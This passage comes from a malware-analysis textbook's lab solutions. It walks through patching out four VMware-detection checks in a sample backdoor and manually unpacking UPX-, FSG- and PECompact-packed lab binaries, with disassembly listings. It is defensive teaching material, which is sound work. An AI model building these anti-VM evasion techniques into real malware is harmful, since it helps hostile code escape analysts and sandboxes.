- en: binary, so that UninstallSB can restore it if necessary.
  prefs: []
  type: TYPE_NORMAL
- en: We’ll leave the full analysis of this malware to you, since our focus here is
    on anti-VM techniques. This malware is an extensive backdoor with considerable
    functionality, including keylogging, capturing audio and video, transferring files,
    acting as a proxy, retrieving system information, using a reverse command shell,
    injecting DLLs, and downloading and launching commands.
  prefs: []
  type: TYPE_NORMAL
- en: To fully analyze this malware, analyze its export functions and static configuration
    options before focusing on the backdoor network communication capability. See
    if you can write a script to decode network traffic generated by this malware.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**677**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 17-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware immediately terminates inside a VM, unlike Lab 12-2, which performs
    process replacement on *svchost.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: If you force the jumps at 0x4019A1, 0x4019C0, and 0x401467 to be taken, and
    the jump at 0x401A2F to not be taken, the malware performs process replacement
    using a keylogger from its resource section.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The malware uses four different anti-VM techniques:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: It uses the backdoor I/O communication port.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: It searches the registry key SYSTEM\CurrentControlSet\Control\ DeviceClasses
    for the string vmware.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: It checks the MAC address to see if it is the default used by VMware.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: It searches the process list with a string-hashing function for processes starting
    with the string vmware.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: To avoid the anti-VM techniques used by this malware, you can remove VMware
    tools and modify the MAC address.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: 'In OllyDbg, you can apply the following patches:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: NOP-out the instruction at 0x40145D.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Change the instructions at 0x40199F and 0x4019BE to xor eax, eax.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Modify the instruction at 0x40169F to jmp 0x40184A.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: As noted in the lab description, this malware is the same as *Lab12-02.exe*
    except that it includes anti-VM techniques. Therefore, a good place to start is
    with a review of Lab 12-2\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Searching for Vulnerable Instructions**'
  prefs: []
  type: TYPE_NORMAL
- en: We begin by loading the binary into IDA Pro and searching for vulnerable x86
    instructions using *findAntiVM.py* (as in Lab 17-1). This script identifies one
    anti-VM instruction at 0x401AC8 and highlights it in red. We notice that this
    is the backdoor I/O communication port being queried via the in instruction. This
    anti-VM technique is contained in the function named sub_401A80 by IDA Pro. This
    function returns 1 if it is executing inside a VM; otherwise, it returns 0\. There
    is only one cross-reference from the beginning of the main function, as shown
    at  in Listing 17-10L.
  prefs: []
  type: TYPE_NORMAL
- en: 0040199A call sub_401A80  ; Query I/O communication port 0040199F test eax,
    eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004019A1 jz short loc_4019AA 
  prefs: []
  type: TYPE_NORMAL
- en: 004019A3 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 004019A5 jmp loc_401A71
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-10L: The check after the call to query the I/O communication port*
    **678**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 154](index-712_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The jz instruction at  must be taken, or the main method will terminate immediately
    by jumping to 0x401A71\. We disable this anti-VM technique by setting the zero
    flag to 1 when execution arrives at the jz instruction. To permanently disable
    this technique, change the test instruction at  into xor eax, eax as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Start OllyDbg and place your cursor on line 0x40199F.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Press the spacebar and enter **xor eax, eax** in the text box.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: Click **Assemble**.
  prefs: []
  type: TYPE_NORMAL
- en: '**Finding Anti-VM Techniques Using Strings**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we use Strings to compare the output from Lab 12-2 to the output from
    *Lab17-03.exe*. The following are the new strings found in this lab: vmware'
  prefs: []
  type: TYPE_NORMAL
- en: SYSTEM\CurrentControlSet\Control\DeviceClasses
  prefs: []
  type: TYPE_NORMAL
- en: Iphlpapi.dll
  prefs: []
  type: TYPE_NORMAL
- en: GetAdaptersInfo
  prefs: []
  type: TYPE_NORMAL
- en: These strings provide us with interesting leads. For example, the string SYSTEM\CurrentControlSet\Control\DeviceClasses
    appears to be a registry path, and GetAdaptersInfo is a function used for getting
    information about the network adapter. Digging deeper into the first string in
    the listing, vmware, with IDA Pro, we find only one cross-reference to this string
    from the subroutine sub_4011C0\.
  prefs: []
  type: TYPE_NORMAL
- en: Figure 17-3L shows the cross-reference graph for sub_4011C0\. The arrows leaving
    sub_4011C0 show that it calls several registry functions. The function also calls
    itself, as shown by the arrow that loops back (making it a recursive function).
    Based on the graph, we suspect that the function is recursively checking the registry
    for the string vmware. Finally, Figure 17-3L shows that sub_4011C0 is called from
    main.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 7**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 17-3L: Cross-reference graph for sub_4011C0*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 17-11L shows where sub_4011C0 is called at  inside the main function.
    Three parameters are pushed onto the stack before the call, including the registry
    key, which we saw in the strings listing.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**679**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004019AA push 2 ; int 004019AC push offset SubKey ; "SYSTEM\\CurrentControlSet\\Control\\Device"...
  prefs: []
  type: TYPE_NORMAL
- en: 004019B1 push 80000002h ; hKey
  prefs: []
  type: TYPE_NORMAL
- en: 004019B6 call sub_4011C0 
  prefs: []
  type: TYPE_NORMAL
- en: 004019BB add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 004019BE test eax, eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004019C0 jz short loc_4019C9 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-11L: The parameters for sub_4011C0 and the check after* Since SYSTEM\CurrentControlSet\Control\DeviceClasses
    is passed to a recursive registry function, we can assume this function is recursively
    checking the registry from that path on. This is a system residue check, as described
    in Chapter 17\. If you examine sub_4011C0 further, you will see it loop through
    the registry subkeys under DeviceClasses. It compares the first six characters
    (after changing them to lowercase) of each subkey name to the string vmware.'
  prefs: []
  type: TYPE_NORMAL
- en: Since our goal is to have the malware run in our safe environment, we just need
    to ensure that the jz instruction at  is taken; otherwise, the program will terminate
    immediately. We disable this anti-VM technique by making sure the zero flag is
    1 when we arrive at the jz instruction. We can permanently disable this check
    by changing the test instruction at  into xor eax, eax using OllyDbg, as described
    in “Searching for Vulnerable Instructions” on page 670\.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we use IDA Pro to check the cross-references for the string GetAdaptersInfo.
    In Listing 17-12L, we see the string referenced at .
  prefs: []
  type: TYPE_NORMAL
- en: 004019C9 push offset aGetadaptersinf ; "GetAdaptersInfo" 
  prefs: []
  type: TYPE_NORMAL
- en: 004019CE push offset LibFileName ; "Iphlpapi.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 004019D3 call ds:LoadLibraryA
  prefs: []
  type: TYPE_NORMAL
- en: 004019D9 push eax ; hModule 004019DA call ds:GetProcAddress
  prefs: []
  type: TYPE_NORMAL
- en: 004019E0 mov GetAdaptersInfo_Address , eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-12L: The dynamic resolution of GetAdaptersInfo* The malware dynamically
    resolves GetAdaptersInfo using LoadLibraryA and GetProcAddress, and loads the
    resulting address into a global variable, which we have renamed GetAdaptersInfo_Address
    at  to make it easier to recognize function calls to the runtime-loaded address
    of GetAdaptersInfo.'
  prefs: []
  type: TYPE_NORMAL
- en: Checking the cross-references to GetAdaptersInfo_Address, we see it called in
    two places within the function sub_401670\. At a high level, this function appears
    similar to a function we examined in Lab 12-2 that loaded the resource section
    containing the keylogger. However, the function in this lab appears to have a
    bunch of code added to the start. Let’s examine that code.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 17-13L shows the start of a series of byte moves at . This byte array
    initialization can be converted to a byte array by double-clicking var_38
  prefs: []
  type: TYPE_NORMAL
- en: and setting it to an array of size 27\. We rename the array to Byte_Array to
    aid our analysis later on.
  prefs: []
  type: TYPE_NORMAL
- en: '**680**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004016A8 mov [ebp+var_38], 0 
  prefs: []
  type: TYPE_NORMAL
- en: 004016AC mov [ebp+var_37], 50h
  prefs: []
  type: TYPE_NORMAL
- en: 004016B0 mov [ebp+var_36], 56h
  prefs: []
  type: TYPE_NORMAL
- en: 004016B4 mov [ebp+var_35], 0
  prefs: []
  type: TYPE_NORMAL
- en: 004016B8 mov [ebp+var_34], 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 004016BC mov [ebp+var_33], 29h
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040170C mov [ebp+var_1F], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401710 mov [ebp+var_1E], 27h
  prefs: []
  type: TYPE_NORMAL
- en: 00401714 mov [ebp+dwBytes], 0
  prefs: []
  type: TYPE_NORMAL
- en: 0040171B lea eax, [ebp+dwBytes]
  prefs: []
  type: TYPE_NORMAL
- en: 0040171E push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040171F push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401721 call GetAdaptersInfo_Address 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-13L: Byte array initialization and first call to GetAdaptersInfo_Address*
    The call to GetAdaptersInfo_Address at  in Listing 17-13L takes two parameters:
    a linked list of IP_ADAPTER_INFO structures and the size of that linked list.
    Here, the linked list passed in is NULL, and the size will be returned in dwBytes.
    Calling GetAdaptersInfo_Address with the first parameter set to NULL is an easy
    way to figure out how much data it returns in order to allocate memory for the
    linked list structure to be used in a second call to GetAdaptersInfo_Address.
    This is the reason the malware uses dwBytes in subsequent calls to GetProcessHeap
    and HeapAlloc.'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 17-14L shows that the malware uses HeapAlloc at  and calls GetAdaptersInfo_Address
    a second time at .
  prefs: []
  type: TYPE_NORMAL
- en: 0040174B call ds:HeapAlloc 
  prefs: []
  type: TYPE_NORMAL
- en: 00401751 mov [ebp+lpMem], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 00401754 cmp [ebp+lpMem], 0
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 00401766 lea edx, [ebp+dwBytes]
  prefs: []
  type: TYPE_NORMAL
- en: 00401769 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040176A mov eax, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: 0040176D push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040176E call GetAdaptersInfo_Address 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-14L: Second call to GetAdaptersInfo_Address, which populates the
    results* **1 7**'
  prefs: []
  type: TYPE_NORMAL
- en: The parameter labeled lpMem by IDA Pro is the return value from HeapAlloc, as
    seen at . This parameter is passed to the second call of GetAdaptersInfo_Address
    at  instead of NULL. After the call to GetAdaptersInfo_Address, the lpMem parameter
    is a pointer to a linked list of IP_ADAPTER_INFO structures with a size of dwBytes.
  prefs: []
  type: TYPE_NORMAL
- en: We must add the IP_ADAPTER_INFO structure to IDA Pro since it failed to recognize
    and label things fully. To do so, press the INSERTkey within the Structures window
    and add the standard structure IP_ADAPTER_INFO. Now apply the structure to data
    in our disassembly as shown in Table 17-1L at ,
  prefs: []
  type: TYPE_NORMAL
- en: , and .
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**681**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 17-1L:** Before and After Applying Structure Information and Standard
    Constants **Before**'
  prefs: []
  type: TYPE_NORMAL
- en: '**After**'
  prefs: []
  type: TYPE_NORMAL
- en: mov edx, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: mov edx, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: cmp dword ptr [edx+1A0h], 6
  prefs: []
  type: TYPE_NORMAL
- en: cmp [edx+**IP_ADAPTER_INFO.Type**], MIB_IF_TYPE_ETHERNET
  prefs: []
  type: TYPE_NORMAL
- en: jz short loc_4017B9
  prefs: []
  type: TYPE_NORMAL
- en: jz short loc_4017B9
  prefs: []
  type: TYPE_NORMAL
- en: mov eax, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: mov eax, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: cmp dword ptr [eax+1A0h], 71h
  prefs: []
  type: TYPE_NORMAL
- en: cmp [eax+**IP_ADAPTER_INFO.Type**], IF_TYPE_IEEE80211
  prefs: []
  type: TYPE_NORMAL
- en: jnz short loc_401816
  prefs: []
  type: TYPE_NORMAL
- en: jnz short loc_401816
  prefs: []
  type: TYPE_NORMAL
- en: mov ecx, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: mov ecx, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: cmp dword ptr [ecx+190h], 2
  prefs: []
  type: TYPE_NORMAL
- en: cmp [ecx+**IP_ADAPTER_INFO.AddressLength**], 2
  prefs: []
  type: TYPE_NORMAL
- en: jbe short loc_401816
  prefs: []
  type: TYPE_NORMAL
- en: jbe short loc_401816
  prefs: []
  type: TYPE_NORMAL
- en: The left side of Table 17-1L shows the code listing before we apply the IP_ADAPTER_INFO
    structure offsets and standard constants to the data. To apply the structure,
    right-click the locations , , and , and you will be given the option to turn
    numbers into the descriptive strings shown in bold in the right side of the table.
    Using the MSDN page for IP_ADAPTER_INFO as reference, we learn about the standard
    constants for Type and see that 0x6 and 0x71 correspond to an adapter type of
    Ethernet or 802.11 wireless (so the address will be a MAC address).
  prefs: []
  type: TYPE_NORMAL
- en: In the three comparisons shown in Table 17-1L, the malware is checking for Ethernet
    or wireless interfaces, and then confirming that the adapter address length is
    greater than 2\. If this check fails, the malware loops to the next adapter in
    the linked list. If the check succeeds, the code shown in Listing 17-15L will
    execute.
  prefs: []
  type: TYPE_NORMAL
- en: 004017CC jmp short loc_4017D7
  prefs: []
  type: TYPE_NORMAL
- en: 004017CE mov edx, [ebp+var_3C]
  prefs: []
  type: TYPE_NORMAL
- en: 004017D1 add edx, 3 
  prefs: []
  type: TYPE_NORMAL
- en: 004017D4 mov [ebp+var_3C], edx
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004017DD mov ecx, 3 
  prefs: []
  type: TYPE_NORMAL
- en: 004017E2 mov eax, [ebp+var_3C]
  prefs: []
  type: TYPE_NORMAL
- en: 004017E5 lea edi, [ebp+eax+Byte_Array] 
  prefs: []
  type: TYPE_NORMAL
- en: 004017E9 mov esi, [ebp+lpMem]
  prefs: []
  type: TYPE_NORMAL
- en: 004017EC add esi, 194h 
  prefs: []
  type: TYPE_NORMAL
- en: 004017F2 xor edx, edx
  prefs: []
  type: TYPE_NORMAL
- en: 004017F4 repe cmpsb
  prefs: []
  type: TYPE_NORMAL
- en: 004017F6 jnz short loc_401814
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-15L: Comparing the adapter address to Byte_Array* To make this
    code more readable, right-click the 194h at  and change it to IP_ADAPTER_INFO.Address.'
  prefs: []
  type: TYPE_NORMAL
- en: The code is comparing the currently referenced IP_ADAPTER_INFO’s address to
    an index in Byte_Array. Byte_Array is indexed at  using EAX, which is filled
    with var_3C, a loop counter that we see incremented by 3 at . The repe cmpsb
    instruction compares Byte_Array to the IP_ADAPTER_INFO.Address for 3 bytes (because
    ECX is set to 3 at ), which means it is checking to see if the first 3 bytes
    of the MAC address are {00h,50h,56h} or {00h,0Ch,29h} and so on. An **682**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Internet search for “00,0C,29” tells us that it is a common start of the default
    MAC address for VMware. Since the array is of size 27, we know that this code
    compares nine different MAC addresses (most associated with VMware).
  prefs: []
  type: TYPE_NORMAL
- en: We permanently disable this check by avoiding the MAC address comparisons altogether.
    Modify the jnz instruction at 0x40169F to be jmp 0x40184A using OllyDbg’s Assemble
    functionality, as we did earlier to force the malware to skip the adapter checks
    and go straight to the resource section manipulation code.
  prefs: []
  type: TYPE_NORMAL
- en: '**Reviewing the Final Check**'
  prefs: []
  type: TYPE_NORMAL
- en: The final anti-VM check in this malware is in sub_401400, which performs process
    replacement. The code in Listing 17-16L shows a call at , which determines if
    the jz at  will be taken. If the jump is not taken, the code will terminate without
    performing the process replacement.
  prefs: []
  type: TYPE_NORMAL
- en: 00401448 xor eax, eax 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 00401456 push 6
  prefs: []
  type: TYPE_NORMAL
- en: 00401458 push 0F30D12A5h
  prefs: []
  type: TYPE_NORMAL
- en: 0040145D call sub_401130 
  prefs: []
  type: TYPE_NORMAL
- en: 00401462 add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 00401465 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401467 jz short loc_401470 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-16L: Final anti-VM check*'
  prefs: []
  type: TYPE_NORMAL
- en: 'As shown in Listing 17-16L, the anti-VM function sub_401130 takes two parameters:
    6 and the integer 0xF30D12A5\. This function loops through the process listing
    by calling CreateToolhelp32Snapshot, Process32First, and Process32Next. Process32Next
    is inside a loop with the code shown in Listing 17-17L.'
  prefs: []
  type: TYPE_NORMAL
- en: 0040116D mov edx, [ebp+arg_4]
  prefs: []
  type: TYPE_NORMAL
- en: 00401170 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 00401171 lea eax, [ebp+pe.szExeFile]
  prefs: []
  type: TYPE_NORMAL
- en: 00401177 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401178 call sub_401060  ; make lowercase
  prefs: []
  type: TYPE_NORMAL
- en: 0040117D add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: '**1 7**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401180 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401181 call sub_401000  ; get string hash 00401186 add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 00401189 mov [ebp+var_130], eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040118F mov ecx, [ebp+var_130]
  prefs: []
  type: TYPE_NORMAL
- en: 00401195 cmp ecx, [ebp+arg_0] 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-17L: Code for comparing a process name string* The function sub_401060
    called at  takes a single parameter containing the name of the process and sets
    all of the parameter’s characters to lowercase. The function sub_401000 called
    at  takes two parameters: 6 (arg_4) and the lowercase string returned from sub_401060\.
    The result of this function is Solutions to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**683**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: compared to the 0xF30D12A5 (arg_0) at . If the result is equal to 0xF30D12A5,
    the function will return 1, which will cause the malware to terminate. In other
    words, sub_401000 is taking the process name and turning it into a number, and
    then seeing if that number is equal to a preset value. sub_401000 is a simple
    string-hashing function. Given the parameter "vmware", it returns 0xF30D12A5\.
    The malware is cleverly using a string hash to avoid using the string vmware in
    the comparison, which would have made easy pickings for the malware analyst.
  prefs: []
  type: TYPE_NORMAL
- en: To permanently disable this final anti-VM check, we can NOP-out the call to
    sub_401130 at 0x40145D. This forces the malware to skip the check and go straight
    to the process-replacement code because the xor at  in Listing 17-16L ensures
    that the EAX register will be 0\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: 'This malware performs four different checks for VMware. Three of these check
    for system residue, and the other queries the I/O communication port. The system
    residue checking techniques include the following:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Check the first 3 bytes of the MAC address for known values associated with
    virtual machines.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Check the registry for the key vmware under the registry path SYSTEM\ CurrentControlSet\Control\DeviceClasses.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Check the process listing for processes beginning with the string vmware in
    any combination of uppercase and lowercase letters.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 18-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab18-01.exe* is Lab 14-1 packed with a slightly modified version of UPX,
    one of the most popular packers encountered in the wild. The modifications to
    UPX make it more resistant to signature detection. When you run PEiD on the packed
    executable, it does not detect the packer. However, a section in the file named
    UPX2 should make you suspect that a UPX-like packer is being used. Running UPX
    –d on the packed file fails because of the modifications made to the packer.'
  prefs: []
  type: TYPE_NORMAL
- en: We first try to unpack the program manually by loading the program in OllyDbg
    to find the OEP. First, we simply page down through the code to see if the tail
    jump is obvious. As you can see in Listing 18-1L, it is.
  prefs: []
  type: TYPE_NORMAL
- en: 00409F32 CALL EBP
  prefs: []
  type: TYPE_NORMAL
- en: 00409F34 POP EAX
  prefs: []
  type: TYPE_NORMAL
- en: 00409F35 POPAD
  prefs: []
  type: TYPE_NORMAL
- en: 00409F36 LEA EAX,DWORD PTR SS:[ESP-80]
  prefs: []
  type: TYPE_NORMAL
- en: 00409F3A PUSH 0
  prefs: []
  type: TYPE_NORMAL
- en: 00409F3C CMP ESP,EAX
  prefs: []
  type: TYPE_NORMAL
- en: 00409F3E JNZ SHORT Lab14-1.00409F3A
  prefs: []
  type: TYPE_NORMAL
- en: 00409F40 SUB ESP,-80
  prefs: []
  type: TYPE_NORMAL
- en: 00409F43 JMP Lab14-1.0040154F
  prefs: []
  type: TYPE_NORMAL
- en: 00409F48 DB 00
  prefs: []
  type: TYPE_NORMAL
- en: '**684**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00409F49 DB 00
  prefs: []
  type: TYPE_NORMAL
- en: 00409F4A DB 00
  prefs: []
  type: TYPE_NORMAL
- en: 00409F4B DB 00
  prefs: []
  type: TYPE_NORMAL
- en: 00409F4C DB 00
  prefs: []
  type: TYPE_NORMAL
- en: 00409F4D DB 00
  prefs: []
  type: TYPE_NORMAL
- en: 00409F4E DB 00
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-1L: Tail jump for the modified UPX packer* The tail jump at  is
    followed by a series of 0x00 bytes. It jumps to a location that is very far away.
    We set a breakpoint on the tail jump and resume execution of our program. Once
    the breakpoint is hit, we single-step on the jmp instruction to take us to the
    OEP.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we dump the process to a disk using **Plugins****OllyDump****Dump**
    **Debugged Process**. Accept all of the default options, click **Dump**, and then
    select a filename for the dumped process.
  prefs: []
  type: TYPE_NORMAL
- en: We’ve dumped the unpacked program to disk, and we’re finished. We can now view
    the program’s imports and strings, and easily analyze it with IDA Pro. A quick
    analysis reveals that this is the same code as Lab 14-1\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 18-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: First, we run PEiD on the *Lab18-02.exe* file, and we learn that the packer
    is FSG 1.0 -> dulek/xt. To unpack this program manually, we first load it into
    OllyDbg. Several warnings state that the file may be packed. Since we already
    know that, we just click through the warnings.
  prefs: []
  type: TYPE_NORMAL
- en: When we load the program, it starts at entry point 0x00405000\. The easiest
    approach is to try the Find OEP by Section Hop option in the OllyDump plug-in.
    We select **Plugins****OllyDump****Find OEP by Section Hop (Trace** **Over)**,
    which stops the program at 0x00401090\. This is encouraging, because 0x00401090
    is close to the beginning of the executable. (The first set of executable instructions
    within a PE file is typically located at 0x00401000, and this is only 0x90 past
    that, which suggests that the Find OEP plug-in tool has worked.) At the instruction
    identified by the OllyDump plug-in, we see the code in Listing 18-2L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401090 DB 55 ; CHAR 'U'
  prefs: []
  type: TYPE_NORMAL
- en: 00401091 DB 8B
  prefs: []
  type: TYPE_NORMAL
- en: 00401092 DB EC
  prefs: []
  type: TYPE_NORMAL
- en: 00401093 DB 6A ; CHAR 'j'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 8**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401094 DB FF
  prefs: []
  type: TYPE_NORMAL
- en: 00401095 DB 68 ; CHAR 'h'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-2L: Code at the OEP that has not been analyzed by OllyDbg* Depending
    on your version, OllyDbg may not have disassembled this code because it did not
    realize that it is code. This is somewhat common and unpredictable when dealing
    with packed programs, and it can be a sign that the code is part of the original
    code, rather than part of the unpacking stub.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**685**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: To force OllyDbg to disassemble the code, right-click the first byte and select
    **Analysis****Analyze** **Code**. This displays the code for the beginning of
    the program, as shown in Listing 18-3L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401090 PUSH EBP ; msvcrt.77C10000
  prefs: []
  type: TYPE_NORMAL
- en: 00401091 MOV EBP,ESP
  prefs: []
  type: TYPE_NORMAL
- en: 00401093 PUSH -1
  prefs: []
  type: TYPE_NORMAL
- en: 00401095 PUSH Lab07-02.00402078
  prefs: []
  type: TYPE_NORMAL
- en: 0040109A PUSH Lab07-02.004011D0
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-3L: Code at the OEP after it has been analyzed by OllyDbg* The
    first two instructions in Listing 18-3L look like the start of a function, further
    convincing us that we have found the OEP. Scrolling down a little, we also see
    the string www.practicalmalwareanalysis.com, which is further evidence that this
    is part of the original program and not the unpacking stub.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we dump the process to a disk using **Plugins****OllyDump****Dump**
    **Debugged** **Process**. Leave all of the default options, click **Dump**, and
    select a filename for the dumped process.
  prefs: []
  type: TYPE_NORMAL
- en: Now, we’re finished. We can view the program’s imports and strings, and easily
    analyze it with IDA Pro. A quick analysis reveals that this is the same code as
    *Lab07-02.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 18-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: First, we run PEiD on the *Lab18-03.exe* file, and it tells us that the packer
    is PECompact 1.68 - 1.84 -> Jeremy Collake. We load the program into OllyDbg and
    see several warnings that the file may be packed. We can ignore these warnings.
  prefs: []
  type: TYPE_NORMAL
- en: The program starts at address 0x00405130\. We try the **Find OEP by** **Section
    Hop (Trace Into)** option in the OllyDump plug-in. We see the code shown in Listing
    18-4L as OllyDump’s guess at the OEP. However, there are several reasons this
    doesn’t look like the OEP. The most obvious is that it accesses values above the
    base pointer at . If this were the file’s entry point, any data above the base
    pointer would not have been initialized.
  prefs: []
  type: TYPE_NORMAL
- en: 0040A110 ENTER 0,0
  prefs: []
  type: TYPE_NORMAL
- en: 0040A114 PUSH EBP
  prefs: []
  type: TYPE_NORMAL
- en: 0040A115 MOV ESI,DWORD PTR SS:[EBP+8]
  prefs: []
  type: TYPE_NORMAL
- en: 0040A118 MOV EDI,DWORD PTR SS:[EBP+C]
  prefs: []
